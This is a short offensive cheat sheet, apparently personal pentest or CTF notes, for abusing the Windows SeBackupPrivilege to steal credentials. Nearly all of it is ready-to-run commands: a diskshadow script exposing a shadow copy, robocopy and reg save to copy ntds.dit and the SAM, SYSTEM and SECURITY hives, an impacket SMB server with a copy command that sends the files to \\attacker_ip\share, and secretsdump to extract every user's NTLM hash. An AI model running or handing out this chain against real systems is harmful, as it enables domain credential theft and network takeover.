# SeBackupPrivileges 
we can restore the backup files that contains the All system user NTLM Hash 

# Steps
1. Create a .dsh file and convert it
2. upload the compiler file
3. Disk shadow and robocopy of the files
4. save the files
5. Download it using the smbserver

# Create viper.dsh file and paste this
```language
set context persistent nowriters
add volume c: alias viper
create
expose %viper% x:
```
# Convert and upload  it
```language
unix2dos viper.dsh

upload viper.dsh
```
# Make a Disk Shadow
```language
diskshadow /s viper.dsh
```
# Save the files
```language
robocopy /b x:\windows\ntds . ntds.dit
reg save hklm\system c:\windows\tasks\system
reg save hklm\sam c:\windows\tasks\sam
reg save hklm\security c:\windows\tasks\security
```
# Download it 
```language
#start a smb server
impacket-smbserver share ./ -smb2support -user 0xmr -pass ''

# connect it
net use \\attacker_ip\share /user:0xmr

# copy all files
copy sam, ntds.dit, system, security \\attacker_ip\share 
```
# Dump (DC sync)
```language
impacket-secretsdump -ntds ntds.dit -system system -sam sam -security security local
```
